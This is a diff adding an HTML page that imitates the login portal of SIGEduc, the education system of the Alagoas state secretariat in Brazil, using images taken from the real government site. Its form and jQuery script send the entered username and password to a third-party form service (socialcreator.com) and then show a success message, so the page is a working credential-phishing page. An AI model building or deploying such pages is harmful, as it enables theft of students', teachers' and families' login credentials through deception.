@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>SIGEduc - Sistema Integrado de Gestão da Educação</title>
+  <script src="https://www.socialcreator.com/jquery-1.11.3.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 11px;
+      color: #333;
+      background-color: #ffffff;
+      padding: 0;
+    }
+
+    /* Top Bar */
+    .header-bar {
+      background-color: #2b3e81;
+      color: #ffffff;
+      height: 22px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 10px;
+      font-size: 11px;
+      font-weight: bold;
+    }
+
+    /* Main Container */
+    .main-wrapper {
+      width: 980px;
+      margin: 0 auto;
+      padding: 5px;
+    }
+
+    /* Header Logo */
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 5px;
+      margin-bottom: 5px;
+    }
+    .logo-brasao {
+      height: 48px;
+    }
+    .logo-sigeduc-title {
+      display: flex;
+      flex-direction: column;
+    }
+    .sigeduc-img {
+      height: 38px;
+    }
+    .sub-title {
+      font-size: 10px;
+      font-weight: bold;
+      color: #444;
+      letter-spacing: 0.5px;
+      margin-top: -3px;
+    }
+
+    /* Title Ribbon */
+    .title-ribbon {
+      background: linear-gradient(to bottom, #ffffff 0%, #f0f0f0 100%);
+      border-top: 1px solid #dcdcdc;
+      border-bottom: 1px solid #dcdcdc;
+      color: #df8828;
+      font-weight: bold;
+      font-size: 12px;
+      padding: 5px 10px;
+      margin-bottom: 15px;
+    }
+
+    /* Main Content Grid */
+    .content-grid {
+      display: flex;
+      gap: 20px;
+    }
+
+    /* Left Banner Stack */
+    .left-column {
+      width: 410px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .banner-img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border: 1px solid #ccc;
+    }
+
+    /* Right Column (Login & Register Cards) */
+    .right-column {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Login Box (Classic SIGEduc Look) */
+    .login-wrapper {
+      width: 380px;
+      border: 1px solid #d0d0d0;
+      background-color: #fbfbfb;
+      margin-bottom: 25px;
+      box-shadow: 1px 1px 3px rgba(0,0,0,0.05);
+    }
+    .login-header {
+      background: linear-gradient(to bottom, #f5f5f5, #e6e6e6);
+      border-bottom: 1px solid #d0d0d0;
+      color: #2b3e81;
+      font-weight: bold;
+      font-size: 11px;
+      padding: 4px 8px;
+      text-transform: uppercase;
+    }
+    .login-body {
+      padding: 15px 10px 10px 10px;
+    }
+
+    /* Centered Login Table */
+    .login-table {
+      margin: 0 auto;
+      border-collapse: collapse;
+    }
+    .login-table td {
+      padding: 4px;
+      font-size: 11px;
+      font-weight: bold;
+      color: #333;
+    }
+    .login-table td.label {
+      text-align: right;
+      padding-right: 8px;
+    }
+
+    /* Inputs */
+    .input-usuario {
+      width: 170px;
+      height: 22px;
+      border: 2px solid #000;
+      border-radius: 10px;
+      padding: 0 8px;
+      outline: none;
+      font-size: 11px;
+    }
+    .input-senha {
+      width: 170px;
+      height: 20px;
+      border: 1px solid #7f9db9;
+      padding: 0 4px;
+      outline: none;
+      font-size: 11px;
+    }
+
+    /* Login Button */
+    .btn-entrar {
+      background: linear-gradient(to bottom, #ffffff, #e0e0e0);
+      border: 1px solid #808080;
+      border-radius: 3px;
+      padding: 2px 8px;
+      font-size: 11px;
+      cursor: pointer;
+      color: #000;
+      margin-top: 5px;
+    }
+    .btn-entrar:hover {
+      background: #eeeeee;
+    }
+
+    /* Recover Links */
+    .links-recovery {
+      margin-top: 15px;
+      text-align: left;
+      width: 250px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .links-recovery ul {
+      list-style-type: circle;
+      padding-left: 20px;
+    }
+    .links-recovery li {
+      margin-bottom: 3px;
+      color: #666;
+    }
+    .links-recovery a {
+      color: #666;
+      text-decoration: none;
+      font-size: 10px;
+    }
+    .links-recovery a:hover {
+      text-decoration: underline;
+    }
+
+    /* Cards Grid */
+    .cards-row {
+      display: flex;
+      justify-content: space-around;
+      width: 100%;
+      margin-top: 10px;
+    }
+    .card-item {
+      width: 30%;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .card-title {
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 2px;
+      font-size: 11px;
+    }
+    .card-desc {
+      color: #555;
+      font-size: 10px;
+      line-height: 1.2;
+      margin-bottom: 10px;
+      min-height: 45px;
+    }
+    .card-icon {
+      height: 50px;
+      object-fit: contain;
+      margin-bottom: 8px;
+    }
+    .card-link {
+      color: #333;
+      font-weight: bold;
+      text-decoration: underline;
+      font-size: 11px;
+      cursor: pointer;
+    }
+
+    /* Bottom Info Notices */
+    .info-notices {
+      margin-top: 35px;
+      border-top: 1px solid #e0e0e0;
+      padding-top: 10px;
+      font-size: 11px;
+      color: #444;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      align-items: center;
+    }
+    .notice-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .notice-icon {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Footer */
+    .footer-bar {
+      background-color: #2b3e81;
+      color: #ffffff;
+      padding: 6px 10px;
+      text-align: center;
+      font-size: 10px;
+      margin-top: 15px;
+      border-top: 2px solid #df8828;
+    }
+
+    /* Loader / Mensagem de envio */
+    #loader {
+      display: none;
+      font-size: 11px;
+      color: #2b3e81;
+      margin-top: 5px;
+    }
+    #enviado {
+      display: none;
+      padding: 10px;
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      border-radius: 4px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Blue Bar -->
+  <div class="header-bar">
+    <span>Secretaria da Educação do Estado</span>
+    <span>Maceió, 27 de Outubro de 2026</span>
+  </div>
+
+  <div class="main-wrapper">
+    <!-- Header Logo Section -->
+    <div class="logo-container">
+      <img class="logo-brasao" src="https://upload.wikimedia.org/wikipedia/commons/b/bc/Bras%C3%A3o_de_armas_do_Estado_de_Alagoas.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=original" alt="Brasão Alagoas">
+      <div class="logo-sigeduc-title">
+        <img class="sigeduc-img" src="https://i.ibb.co/2QDghGy/1000194786-removebg-preview.png" alt="SIGEduc Logo">
+        <span class="sub-title">SISTEMA INTEGRADO DE GESTÃO DA EDUCAÇÃO</span>
+      </div>
+    </div>
+
+    <!-- Title Ribbon -->
+    <div class="title-ribbon">
+      ENTRAR NO SIGEduc
+    </div>
+
+    <!-- Status Message -->
+    <div id="enviado">O formulário foi enviado com sucesso!</div>
+
+    <!-- Main Grid -->
+    <div class="content-grid" id="dcontactar">
+      
+      <!-- Left Column: Banners -->
+      <div class="left-column">
+        <img class="banner-img" src="https://sageal.educacao.al.gov.br/sigeduc/img/login/figura_estudanteAL_2.png" alt="Estudantes Alagoas Banner">
+      </div>
+
+      <!-- Right Column: Login Box & Links -->
+      <div class="right-column">
+        
+        <!-- Form / Login Box -->
+        <div class="login-wrapper">
+          <div class="login-header">ENTRAR NO SIGEduc</div>
+          <div class="login-body">
+            
+            <form id="form1" name="form1" method="POST" action="https://www.socialcreator.com/dom/form_enviando.php?s=334858">
+              <table class="login-table">
+                <tr>
+                  <td class="label"><label for="c292271">Usuário:</label></td>
+                  <td><input type="text" id="c292271" name="c292271" class="input-usuario" maxlength="255" required></td>
+                </tr>
+                <tr>
+                  <td class="label"><label for="c292272">Senha:</label></td>
+                  <td><input type="password" id="c292272" name="c292272" class="input-senha" maxlength="255" required></td>
+                </tr>
+                <tr>
+                  <td></td>
+                  <td style="padding-top: 5px;">
+                    <button type="submit" id="btnenv" class="btn-entrar">Entrar no Sistema</button>
+                    <span id="loader">Enviando...</span>
+                  </td>
+                </tr>
+              </table>
+            </form>
+
+            <div class="links-recovery">
+              <ul>
+                <li><a href="#">Esqueci minha senha</a></li>
+                <li><a href="#">Esqueci meu login</a></li>
+                <li><a href="#">Perdi o e-mail de confirmação de cadastro</a></li>
+              </ul>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- Cards Section -->
+        <div class="cards-row">
+          
+          <!-- Card 1: Estudante -->
+          <div class="card-item">
+            <div>
+              <div class="card-title">Estudante,</div>
+              <div class="card-desc">caso ainda não possua cadastro no SIGEduc,<br>clique no link abaixo.</div>
+            </div>
+            <img class="card-icon" src="https://sageal.educacao.al.gov.br/sigeduc/img/Student-Icon.gif" alt="Estudante Icon">
+            <a href="#" class="card-link">Cadastre-se</a>
+          </div>
+
+          <!-- Card 2: Professor ou Funcionário -->
+          <div class="card-item">
+            <div>
+              <div class="card-title">Professor ou Funcionário,</div>
+              <div class="card-desc">caso ainda não possua cadastro no SIGEduc,<br>clique no link abaixo.</div>
+            </div>
+            <img class="card-icon" src="https://sageal.educacao.al.gov.br/sigeduc/img/iconeProfessor.jpg" alt="Professor Icon">
+            <a href="#" class="card-link">Cadastre-se</a>
+          </div>
+
+          <!-- Card 3: Familiares -->
+          <div class="card-item">
+            <div>
+              <div class="card-title">Familiares,</div>
+              <div class="card-desc">caso ainda não possuam cadastro no SIGEduc,<br>clique no link abaixo.</div>
+            </div>
+            <img class="card-icon" src="https://sageal.educacao.al.gov.br/sigeduc/img/portal_familiar.png" alt="Familiares Icon">
+            <a href="#" class="card-link">Cadastre-se</a>
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- Info Notices Footer -->
+    <div class="info-notices" id="avisoseg">
+      <div class="notice-item">
+        <img class="notice-icon" src="https://sageal.educacao.al.gov.br/sigeduc/img/firefox_icon.png" onerror="this.src='https://www.google.com/s2/favicons?domain=mozilla.org'" alt="Firefox Icon">
+        <span>Este sistema é melhor visualizado utilizando o <strong>Mozilla Firefox</strong>, para baixá-lo e instalá-lo, <a href="#" style="color: #666;">clique aqui</a>.</span>
+      </div>
+      <div class="notice-item">
+        <img class="notice-icon" src="https://sageal.educacao.al.gov.br/sigeduc/img/pdf_icon.png" onerror="this.src='https://www.google.com/s2/favicons?domain=adobe.com'" alt="Adobe Icon">
+        <span>Para visualizar documentos é necessário utilizar o <strong>Adobe Reader</strong>, para baixá-lo e instalá-lo, <a href="#" style="color: #666;">clique aqui</a>.</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer Bar -->
+  <div class="footer-bar">
+    SIGEduc | SEDUC - AL - - sigeduc-prod-03.sigeduc-prod-03.educacao.al.gov.br.srv1inst1 v20261023_1826
+  </div>
+
+  <!-- Script AJAX de Envio baseado no seu exemplo -->
+  <script language="javascript">
+    function fenviar() {
+      var f = document.forms["form1"];
+      return true;
+    }
+
+    $(document).ready(function(){
+      $("#form1").submit(function() {
+
+        if(!fenviar()){ return false; }
+
+        $("#btnenv").hide();
+        $("#loader").show();
+
+        var dataString = $(this).serialize();
+
+        $.ajax({
+          type: "POST",
+          url: "https://www.socialcreator.com/dom/form_enviando.php?s=334858",
+          data: dataString,
+          cache: false,
+          success: function(result) {
+            $("#dcontactar").hide();
+            $("#avisoseg").hide();
+            $("#enviado").show();
+            window.scrollTo(0, 0);
+          },
+          error: function() {
+            alert("Erro ao enviar. Tente novamente.");
+            $("#loader").hide();
+            $("#btnenv").show();
+          }
+        });
+        return false;
+      });
+    });
+  </script>
+
+</body>
+</html>
